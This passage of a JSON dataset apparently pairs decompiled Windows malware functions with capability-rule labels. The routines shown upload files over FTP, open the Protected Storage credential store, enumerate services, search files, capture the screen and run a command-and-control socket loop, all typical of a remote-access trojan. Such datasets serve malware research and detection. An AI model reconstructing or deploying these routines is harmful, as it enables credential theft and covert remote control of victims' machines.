        "decompiled_code": "\nvoid fcn.004709e0(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4709f5;\n    fcn.004058ec();\n    puStack20 = 0x4709fd;\n    fcn.004058ec();\n    uStack24 = 0x470a58;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x492518 != '\\0') {\n        puStack20 = &stack0xfffffffc;\n        uVar1 = fcn.004058fc(2, 0);\n        uVar1 = fcn.004058fc(uVar1);\n        in_stack_ffffffd0 = *0x4987d0;\n        sub.wininet.dll_FtpPutFileA(*0x4987d0, uVar1);\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405490(0x470a5f);\n    return;\n}\n",
        "token_count": 282
    },
    "00470c80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00470c80(uint *arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint *in_ECX;\n    uint *in_EDX;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_38h = 0;\n    var_34h = 0;\n    var_8h = NULL;\n    var_30h = *in_ECX;\n    uStack48 = in_ECX[1];\n    uStack44 = in_ECX[2];\n    uStack40 = in_ECX[3];\n    var_20h = *in_EDX;\n    uStack32 = in_EDX[1];\n    uStack28 = in_EDX[2];\n    uStack24 = in_EDX[3];\n    puStack76 = 0x470cb4;\n    var_4h = in_EAX;\n    fcn.0040716c();\n    uStack80 = 0x470d7b;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0040546c();\n    (**(*var_4h + 0x54))(var_4h, 0, &fcn.00470c80::var_20h, &fcn.00470c80::var_30h, 0, &fcn.00470c80::var_8h);\n    var_ch = 0;\n    do {\n        (**(*var_8h + 0xc))(var_8h, 1, &fcn.00470c80::var_10h, &fcn.00470c80::var_ch);\n        if (var_ch != 0) {\n            fcn.00405694(*arg_8h);\n            fcn.00405800(0x470d94, var_34h);\n            fcn.00470a78(&fcn.00470c80::var_38h, var_10h);\n            var_4h = 0x470d94;\n            fcn.00405800();\n        }\n    } while (var_ch != 0);\n    *in_FS_OFFSET = var_4h;\n    fcn.00405490(0x470d82);\n    fcn.004070f8();\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 637
    },
    "00470dd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470dd0(uint *param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_38h = 0;\n    var_30h = 0;\n    var_34h = 0;\n    var_8h = NULL;\n    var_1ch = *param_2;\n    uStack28 = param_2[1];\n    uStack24 = param_2[2];\n    uStack20 = param_2[3];\n    puStack76 = 0x470dfd;\n    var_4h = in_EAX;\n    fcn.0040716c();\n    uStack80 = 0x470ed2;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0040546c();\n    (**(*var_4h + 0x3c))(var_4h, 0, &fcn.00470dd0::var_1ch, 0, &fcn.00470dd0::var_8h);\n    var_ch = 0;\n    do {\n        (**(*var_8h + 0xc))(var_8h, 1, &fcn.00470dd0::var_2ch, &fcn.00470dd0::var_ch);\n        if (var_ch != 0) {\n            fcn.00470da0(*param_1);\n            fcn.00470bd4(0x470ee8, var_30h);\n            fcn.00405800(0x470ef4, var_34h);\n            fcn.00470c80(&fcn.00470dd0::var_38h);\n            var_4h = 0x470ef4;\n            fcn.00405800();\n        }\n    } while (var_ch != 0);\n    *in_FS_OFFSET = var_4h;\n    fcn.00405490(0x470ed9);\n    fcn.004070f8();\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 576
    },
    "00470ef8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470ef8(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_8h = NULL;\n    puStack56 = 0x470f1b;\n    var_4h = in_EAX;\n    fcn.0040716c();\n    uStack60 = 0x470fe5;\n    piStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fcn.0040546c();\n    (**(*var_4h + 0x38))(var_4h, 0, 0, &fcn.00470ef8::var_8h);\n    var_ch = 0;\n    do {\n        (**(*var_8h + 0xc))(var_8h, 1, &fcn.00470ef8::var_1ch, &fcn.00470ef8::var_ch);\n        if (var_ch != 0) {\n            fcn.00470da0(*param_2);\n            fcn.00470c30(0x470ffc, 0);\n            fcn.00405800(0x471008, 0);\n            fcn.00470dd0(*param_2);\n            var_4h = 0x471008;\n            fcn.00405800();\n        }\n    } while (var_ch != 0);\n    *in_FS_OFFSET = var_4h;\n    fcn.00405490(0x470fec);\n    fcn.004070f8();\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 452
    },
    "0047106c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.0047106c(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint *puVar2;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_18h = 0x4712e7;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047106c::var_1ch;\n    var_20h = 0x471094;\n    var_10h = unaff_EBX;\n    fcn.0040546c();\n    var_20h = 0;\n    var_24h = 0;\n    puVar2 = 0x4987dc;\n    sub.pstorec.dll_PStoreCreateInstance(0x4987dc, *0x4987e0);\n    fcn.0047100c();\n    fcn.00470ef8();\n    if (var_4h != 0) {\n        while (iVar1 = fcn.00405a48(),  0 < iVar1) {\n            puVar2 = &fcn.0047106c::var_8h;\n            fcn.00405a48();\n            fcn.00405964();\n            iVar1 = fcn.00405a48();\n            if (iVar1 < 1) {\n                fcn.00405a48();\n                fcn.004059a4();\n            }\n            else {\n                fcn.00405a48(&fcn.0047106c::var_1ch);\n                fcn.00405964();\n                fcn.00405784();\n                fcn.00405a48();\n                fcn.004059a4();\n                puVar2 = &fcn.0047106c::var_8h;\n                fcn.00405a48();\n                fcn.00405964();\n                fcn.00405a48();\n                fcn.004059a4();\n                iVar1 = fcn.00405a48();\n                if (0 < iVar1) {\n                    while (iVar1 = fcn.00405a48(),  0 < iVar1) {\n                        fcn.00405a48(&fcn.0047106c::var_20h);\n                        fcn.00405964();\n                        fcn.00405784();\n                        fcn.00405a48();\n                        fcn.004059a4();\n                        puVar2 = &fcn.0047106c::var_24h;\n                        fcn.00405a48();\n                        fcn.00405964();\n                        fcn.00405784();\n                        fcn.00405a48();\n                        fcn.004059a4();\n                        if ((var_10h != 0) && (var_14h != NULL)) {\n                            puVar2 = 0x4712fc;\n                            fcn.00405800();\n                        }\n                    }\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = puVar2;\n    var_24h = 0x4712ee;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 800
    },
    "004717dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004717dc(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    char **ppcVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    bool bVar5;\n    uint uStackY18476;\n    uint uStackY18472;\n    uchar *puStackY18468;\n    uint *puStackY18464;\n    uint *puStackY18460;\n    char *apcStackY18456 [3048];\n    uint uStackY6264;\n    uint uStackY6256;\n    uint uStackY6252;\n    uchar *puStackY6248;\n    uint uStackY6244;\n    uint *puStackY6240;\n    uint *puStackY6236;\n    uint *puStackY6232;\n    int32_t iStackY6228;\n    uint uStackY6224;\n    uchar *arg_8h;\n    int32_t iStack6216;\n    uint uStack6212;\n    uchar *puStack6208;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t hSCManager;\n    int32_t *var_4h;\n    \n    puStack6208 = &stack0xfffffffc;\n    piVar1 = 0x4;\n    do {\n        piVar2 = piVar1;\n        piVar1 = piVar2 + -1;\n    } while (piVar2 + -1 != NULL);\n    uStackY18476 = 0;\n    puStackY18468 = NULL;\n    uStackY18472 = 0;\n    puStackY18464 = NULL;\n    puStackY18460 = NULL;\n    uStack6212 = 0x4719c4;\n    iStack6216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe7b8;\n    var_4h = piVar2;\n    fcn.0040546c();\n    uStackY6224 = 0;\n    iStackY6228 = 0;\n    puStackY6232 = 0x471843;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        var_14h = 0;\n        do {\n            puStackY6232 = &fcn.004717dc::var_14h;\n            puStackY6236 = &fcn.004717dc::var_10h;\n            puStackY6240 = &fcn.004717dc::var_ch;\n            uStackY6244 = 0x4800;\n            puStackY6248 = &stack0xffffb7e8;\n            uStackY6252 = 3;\n            uStackY6256 = 0x13f;\n            iStackY6228 = hSCManager;\n            uStackY6264 = 0x47187d;\n            sub.advapi32.dll_EnumServicesStatusA();\n            if (-1 < var_10h + -1) {\n                ppcVar3 = &stack0xffffb7e8;\n                iVar4 = var_10h;\n                do {\n                    bVar5 = *ppcVar3 == NULL;\n                    if (!bVar5) {\n                        bVar5 = **ppcVar3 == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x4718a7;\n                        fcn.00405738();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x4718b8;\n                        fcn.00405664();\n                        puStackY6236 = puStackY18460;\n                        puStackY6240 = 0x4719dc;\n                        uStackY6244 = 0x4718cf;\n                        fcn.00405800();\n                    }\n                    bVar5 = ppcVar3[1] == NULL;\n                    if (!bVar5) {\n                        bVar5 = *ppcVar3[1] == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x4718e7;\n                        fcn.00405738();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x4718f9;\n                        fcn.00405664();\n                        puStackY6236 = puStackY18464;\n                        puStackY6240 = 0x4719dc;\n                        uStackY6244 = 0x471910;\n                        fcn.00405800();\n                    }\n                    puStack6208 = 0x47191f;\n                    fcn.00405664();\n                    puStack6208 = 0x471930;\n                    fcn.00471440();\n                    puStack6208 = puStackY18468;\n                    uStack6212 = 0x4719dc;\n                    iStack6216 = 0x471947;\n                    fcn.00405800();\n                    iStack6216 = *piVar2;\n                    arg_8h = &stack0xffffb7d4;\n                    uStackY6224 = 0x47195d;\n                    fcn.00405664();\n                    uStackY6224 = 0x47196c;\n                    fcn.00471654(arg_8h);\n                    uStackY6224 = uStackY18476;\n                    iStackY6228 = 0x4719e8;\n                    puStackY6232 = 0x471983;\n                    fcn.00405800();\n                    ppcVar3 = ppcVar3 + 9;\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n        } while (var_ch != 0);\n        if (hSCManager != 0) {\n            iStackY6228 = hSCManager;\n            puStackY6236 = 0x4719a6;\n            sub.advapi32.dll_CloseServiceHandle();\n        }\n    }\n    *in_FS_OFFSET = iStackY6228;\n    uStackY6224 = 0x4719c3;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1363
    },
    "00472350": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00472350(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint *noname_0_00;\n    uint uVar3;\n    uint uStack416;\n    uint uStack412;\n    uchar *puStack408;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_16dh;\n    uint var_168h;\n    uint var_158h;\n    uint var_154h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_17ch = 0;\n    var_178h = 0;\n    var_174h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    puStack396 = 0x472399;\n    fcn.00405f08();\n    uStack400 = 0x472572;\n    uStack404 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe6c;\n    puStack408 = 0x4723b1;\n    puStack396 = &stack0xfffffffc;\n    fcn.0040e7a4();\n    puStack408 = 0x4723bc;\n    fcn.00405504();\n    puStack408 = 0x4723d0;\n    fcn.00405784();\n    puStack408 = 0x4723e6;\n    iVar1 = fcn.0040a400();\n    if (iVar1 != 0) {\n        if (var_16dh != '\\0') {\n            puStack408 = 0x47247b;\n            fcn.00405784();\n            puStack408 = 0x472491;\n            iVar1 = fcn.0040a400();\n            if (iVar1 == 0) {\n                uStack412 = 0x47252f;\n                uStack416 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffe60;\n                puStack408 = &stack0xfffffffc;\n                do {\n                    bVar2 = (var_158h & 0x10) == 0;\n                    if (!bVar2) {\n                        fcn.00405894();\n                        if (!bVar2) {\n                            fcn.00405894();\n                            if (!bVar2) {\n                                noname_0_00 = &fcn.00472350::var_17ch;\n                                iVar1 = arg_ch;\n                                fcn.00405784();\n                                fcn.00472350(noname_0_00, iVar1);\n                            }\n                        }\n                    }\n                    iVar1 = fcn.0040a450();\n                } while (iVar1 == 0);\n                *in_FS_OFFSET = uStack416;\n                puStack408 = 0x472536;\n                uStack412 = 0x47252e;\n                fcn.0040a474();\n                return;\n            }\n        }\n        *in_FS_OFFSET = uStack404;\n        puStack396 = 0x472579;\n        uStack400 = 0x472553;\n        fcn.00405490();\n        uStack400 = 0x472564;\n        fcn.00405fcc();\n        uStack400 = 0x472571;\n        fcn.00405490();\n        return;\n    }\n    uStack412 = 0x472454;\n    *in_FS_OFFSET = &stack0xfffffe60;\n    puStack408 = &stack0xfffffffc;\n    do {\n        uVar3 = *(arg_ch + -4);\n        uStack416 = 0x472588;\n        fcn.00405800();\n        if (*0x49253c != '\\0') {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread(0);\n        }\n        iVar1 = fcn.0040a450();\n    } while (iVar1 == 0);\n    *in_FS_OFFSET = uStack416;\n    fcn.0040a474(0x47245b, uVar3);\n    return;\n}\n",
        "token_count": 935
    },
    "004725b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004725b0 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    puStack52 = 0x4725d8;\n    fcn.00405f08();\n    uStack56 = 0x4726a4;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.0040858c();\n    fcn.00405504();\n    fcn.00405504();\n    uStack72 = 0x472620;\n    fcn.00472350(&fcn.004725b0::var_20h, &stack0xfffffffc);\n    uStack72 = 0x472658;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    if (var_4h == 0) {\n        fcn.00472b58();\n    }\n    fcn.004726cc();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 348
    },
    "004729bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004729bc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    bool bVar2;\n    uint uVar3;\n    uint in_stack_ffffffc4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint lParam;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x472b35;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *0x498804 = 0;\n    uVar1 = true;\n    *0x49882c = 0;\n    *0x492548 = 0;\n    puStack36 = 0x4729f6;\n    fcn.00405894();\n    if (uVar1) {\n        puStack36 = 0x4729ff;\n        fcn.00488ba4();\n    }\n    puStack36 = 0x472a0e;\n    fcn.00405894();\n    if (uVar1) {\n        puStack36 = 0x472a17;\n        fcn.00488cf8();\n    }\n    puStack36 = 0x472a26;\n    fcn.00405894();\n    if (uVar1) {\n        puStack36 = 0x472a2f;\n        fcn.0048a324();\n    }\n    bVar2 = true;\n    uStack40 = 0x472a74;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00405894();\n    if (bVar2) {\n        in_stack_ffffffc4 = *(**0x49291c + 0x30);\n        sub.user32.dll_SendMessageA(in_stack_ffffffc4, 0x112, 0xf170, 0xffffffff);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    *0x492538 = 0;\n    if (**0x492610 != 0) {\n        fcn.00405664();\n        sub.user32.dll_PostThreadMessageA(**0x492610, 6, 4, 0);\n    }\n    *0x49253c = 0;\n    **0x492610 = 0;\n    if (*0x498910 == 1) {\n        fcn.00468398();\n    }\n    *0x498910 = 0;\n    sub.wsock32.dll_shutdown(*0x4987e4, 1);\n    sub.wsock32.dll_closesocket(*0x4987e4);\n    sub.wsock32.dll_WSACleanup();\n    *0x4987e4 = 0;\n    *0x49881c = 0;\n    *0x498834 = 0;\n    uVar3 = 0;\n    sub.kernel32.dll_CreateThread(0, 0, fcn.00472c78, 0, 0, 0x498818);\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x472b3c);\n    return;\n}\n",
        "token_count": 720
    },
    "00472c78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00472c78 noreturn (void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack4576;\n    uint uStack4572;\n    uchar *puStack4568;\n    int32_t iStack4564;\n    uint uStack4560;\n    uchar *puStack4556;\n    uint var_11b8h;\n    uint var_11b4h;\n    uint var_11b0h;\n    uint var_11ach;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_19ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4556 = &stack0xfffffffc;\n    puStack4568 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack4560 = 0x472f51;\n    iStack4564 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack4564;\n    uStack4572 = 0x472f05;\n    iStack4576 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack4576;\n    iVar5 = 0;\n    iVar2 = fcn.00406858();\n    while( true ) {\n        while( true ) {\n            do {\n                do {\n                    if (iVar2 <= iVar5) {\n                        iVar5 = 0;\n                    }\n                    fcn.00405504();\n                    fcn.00405a48(&var_ch);\n                    fcn.00405964();\n                    fcn.00405a48();\n                    fcn.004059a4();\n                    *0x49880c = fcn.00409e54();\n                    *0x498808 = fcn.004058fc();\n                    iVar5 = iVar5 + 1;\n                    fcn.004033ac();\n                    if ((*0x49252c == 0) || (*0x492530 < 2)) {\n                        *0x49252c = 1;\n                        *0x492530 = 1000;\n                    }\n                    *0x492528 = fcn.004033d4();\n                    *0x492528 = *0x492528 + *0x49252c;\n                    iStack4576 = *0x492528;\n                    sub.kernel32.dll_Sleep_1();\n                    cVar1 = fcn.0048a37c();\n                } while (cVar1 == '\\0');\n                fcn.00403aac();\n                iStack4576 = 2;\n                iVar3 = sub.wsock32.dll_WSAStartup();\n            } while (iVar3 != 0);\n            iStack4576 = 2;\n            *0x4987e4 = sub.wsock32.dll_socket();\n            if (*0x4987e4 != -1) break;\n            sub.wsock32.dll_WSACleanup();\n        }\n        var_1ach._0_2_ = 2;\n        var_1ach._2_2_ = sub.wsock32.dll_htons(*0x49880c);\n        uVar4 = fcn.00489450();\n        var_1a8h = sub.wsock32.dll_inet_addr(uVar4);\n        iVar3 = sub.wsock32.dll_connect(*0x4987e4, &var_1ach, 0x10);\n        if (iVar3 == 0) break;\n        sub.wsock32.dll_shutdown(*0x4987e4, 1);\n        iStack4576 = *0x4987e4;\n        sub.wsock32.dll_closesocket();\n        sub.wsock32.dll_WSACleanup();\n    }\n    *0x498804 = 1;\n    while( true ) {\n        fcn.00403aac();\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 < 1) break;\n        fcn.00405d5c();\n        fcn.00409b48();\n        fcn.004056f4();\n        fcn.0046992c();\n        fcn.00405504();\n        fcn.00472f6c();\n    }\n    fcn.004729bc();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 982
    },
    "0047dc3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047dc3c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_1ch = 0;\n    puStack48 = 0x47dc59;\n    var_18h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    uStack52 = 0x47dd98;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar3 = 0;\n    arg_8h = &fcn.0047dc3c::var_1ch;\n    puStack48 = &stack0xfffffffc;\n    fcn.0040eeb8(arg_8h, *0x47dda8);\n    fcn.00405504();\n    if (var_4h != 0) {\n        piVar1 = fcn.00404610();\n        (**(*piVar1 + 0x2c))();\n        do {\n            (**(*piVar1 + 0xc))();\n            fcn.00405a48(&fcn.0047dc3c::var_ch);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405504();\n            fcn.00406a14(iVar3 + 1);\n            fcn.00405800(var_10h, 0x47ddcc, var_ch);\n            iVar3 = iVar3 + 1;\n            (**(*piVar1 + 0x48))();\n            iVar2 = (**(*piVar1 + 0x14))();\n        } while (iVar2 != 0);\n    }\n    fcn.00406a5c();\n    *in_FS_OFFSET = arg_8h;\n    iStack56 = 0x47dd9f;\n    fcn.0040546c();\n    fcn.00406a20();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 586
    },
    "0047e994": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047e994(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    int64_t iVar4;\n    uint uVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47eb34;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    fcn.0041bd84();\n    *0x498988 = sub.user32.dll_GetDC(0);\n    var_4h = *0x498974;\n    var_8h = -1;\n    if (*0x498974 < *0x498968) {\n        do {\n            fcn.0042915c();\n            fcn.00424c44();\n            fcn.0042915c(0, 0, *0x498964, 1, *0x498988, 0, var_4h, 0xcc0020);\n            fcn.00424ec0();\n            sub.gdi32.dll_BitBlt();\n            fcn.0042915c();\n            fcn.00424db4();\n            piVar1 = fcn.004292cc();\n            piVar2 = fcn.004292cc();\n            *0x498980 = 0;\n            iVar3 = 0;\n            if (0 < *0x498964) {\n                do {\n                    if (*piVar1 != *piVar2) {\n                        if (*0x498980 < 1) {\n                            *0x498978 = iVar3 + -0x20;\n                        }\n                        *0x498980 = iVar3 + 0x20;\n                    }\n                    piVar1 = piVar1 + 1;\n                    piVar2 = piVar2 + 1;\n                    iVar3 = iVar3 + *0x49898d;\n                } while (iVar3 < *0x498964);\n            }\n            if (0 < *0x498980) {\n                if (var_8h == var_4h) {\n                    *0x49897c = var_4h;\n                }\n                else {\n                    *0x49897c = var_4h + -0x13;\n                }\n                var_8h = var_4h + 0x13;\n                *0x498984 = var_8h;\n                fcn.0047eb4c();\n            }\n            var_4h = var_4h + 0x13;\n        } while (var_4h < *0x498968);\n    }\n    uVar5 = 0;\n    sub.user32.dll_ReleaseDC(0, *0x498988);\n    *0x498974 = (*0x498974 + 3) % 0x13;\n    iVar4 = 